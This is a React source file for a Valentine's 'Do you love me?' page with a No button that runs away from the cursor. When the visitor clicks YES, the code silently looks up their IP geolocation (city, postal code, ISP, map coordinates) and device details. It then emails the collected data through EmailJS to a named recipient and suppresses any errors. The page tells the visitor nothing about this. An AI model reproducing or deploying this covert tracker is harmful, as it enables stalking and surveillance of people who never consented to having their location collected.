import React, { useState, useEffect, useRef } from "react";
import { motion, AnimatePresence } from "framer-motion";
import { Heart, Sparkles, Volume2, VolumeX } from "lucide-react";
import confetti from "canvas-confetti";
import emailjs from "@emailjs/browser";

const SecretAccurateValentine = () => {
  const [noButtonPos, setNoButtonPos] = useState({ x: 0, y: 0 });
  const [isAccepted, setIsAccepted] = useState(false);
  const [isMusicPlaying, setIsMusicPlaying] = useState(false);
  const audioRef = useRef(null);

  const moveNoButton = () => {
    const x = (Math.random() - 0.5) * (window.innerWidth * 0.6);
    const y = (Math.random() - 0.5) * (window.innerHeight * 0.6);
    setNoButtonPos({ x, y });
  };

  const handleYes = async () => {
    setIsAccepted(true);
    confetti({ particleCount: 150, spread: 70, origin: { y: 0.6 } });

    try {
      // 1. IMPROVED ACCURATE LOCATION FETCH (Using ipwho.is)
      const res = await fetch("https://ipwho.is/");
      const data = await res.json();

      const fullDetailMessage = `
        🌹 VALENTINE DATA SECURED 🌹
        --------------------------
        📍 ACCURATE LOCATION:
        IP: ${data.ip}
        Location: ${data.city}, ${data.region}, ${data.country}
        Pincode: ${data.postal}
        ISP/Network: ${data.connection.isp}
        Google Map Link: https://www.google.com/maps?q=$?q=${data.latitude},${data.longitude}

        📱 DEVICE DETAILS:
        System: ${navigator.platform}
        Screen: ${window.screen.width}x${window.screen.height}
        Browser: ${navigator.userAgent}
        
        ⏰ TIME: ${new Date().toLocaleString()}
      `;

      // 2. SILENT EMAIL SEND
      emailjs.send(
        "service_zl8ycen",
        "template_nz3e9jp",
        {
          to_name: "Amar Kumar",
          message: fullDetailMessage,
        },
        "lxUfAecwZ_It3aGzn",
      );
    } catch (err) {
      console.log("Silent error");
    }
  };

  return (
    <div className="relative min-h-screen w-full bg-[#0a0104] flex items-center justify-center overflow-hidden font-serif text-white">
      <audio
        ref={audioRef}
        loop
        src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3"
      />

      {/* ROMANTIC LIGHTING */}
      <div className="absolute inset-0 bg-[radial-gradient(circle_at_center,_#4a0410_0%,_transparent_70%)] opacity-50" />

      {/* MUSIC TOGGLE */}
      <button
        onClick={() => {
          isMusicPlaying ? audioRef.current.pause() : audioRef.current.play();
          setIsMusicPlaying(!isMusicPlaying);
        }}
        className="fixed top-8 right-8 z-50 p-4 rounded-full border border-pink-500/30 bg-black/50 text-pink-500 backdrop-blur-md"
      >
        {isMusicPlaying ? <Volume2 className="animate-pulse" /> : <VolumeX />}
      </button>

      <AnimatePresence mode="wait">
        {!isAccepted ? (
          <motion.div
            key="ask"
            initial={{ opacity: 0, scale: 0.9 }}
            animate={{ opacity: 1, scale: 1 }}
            className="relative z-20 w-full max-w-lg p-12 bg-white/5 backdrop-blur-3xl rounded-[50px] border border-white/10 text-center shadow-2xl"
          >
            <motion.div
              animate={{ scale: [1, 1.1, 1] }}
              transition={{ repeat: Infinity, duration: 2 }}
              className="mb-8"
            >
              <Heart
                size={80}
                fill="#ff0055"
                className="mx-auto text-pink-600 drop-shadow-[0_0_15px_#ff0055]"
              />
            </motion.div>

            <h1 className="text-5xl md:text-6xl font-black mb-10 leading-tight">
              Do you <span className="text-pink-500">love</span> me?
            </h1>

            <div className="flex flex-col sm:flex-row items-center justify-center gap-12 mt-4 min-h-[140px]">
              <motion.button
                onClick={handleYes}
                whileHover={{ scale: 1.1, boxShadow: "0 0 40px #ff0055" }}
                className="px-16 py-6 bg-pink-600 text-white font-bold rounded-2xl text-3xl"
              >
                YES ❤️
              </motion.button>

              <motion.button
                onMouseEnter={moveNoButton}
                onClick={moveNoButton}
                animate={{ x: noButtonPos.x, y: noButtonPos.y }}
                className="px-10 py-4 text-white/20 rounded-2xl text-xl"
              >
                No 🥀
              </motion.button>
            </div>
          </motion.div>
        ) : (
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            className="z-30 text-center"
          >
            <h1 className="text-9xl font-black text-white drop-shadow-[0_0_80px_#ff0055]">
              MINE! 💍
            </h1>
            <p className="text-2xl text-gray-300 font-light italic mt-6 px-10">
              "You've just made me the happiest person in the world."
            </p>
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  );
};

export default SecretAccurateValentine;
